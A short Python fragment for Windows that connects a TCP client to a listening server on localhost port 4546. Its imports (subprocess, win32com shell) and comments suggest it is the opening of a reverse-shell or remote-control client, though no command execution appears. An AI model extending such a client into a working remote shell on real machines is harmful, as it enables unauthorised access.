import argparse
import socket
import subprocess
import sys
import threading
import os
import time
from win32com.shell import shell

host="127.0.0.1" # ip of the listening server we wish to connect to
port=4546 # port for the listening server we wish to connect to
    

    # socket.AF_INET = create an IPV4 socket
    # socket.SOCK_STREAM = create a TCP socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a IPV4 TCP/IP networking
try:
    client.connect((host, port)) #connect over to our server!
except:
    print("server/socket must have died...") #self-explanatory
    os._exit(0)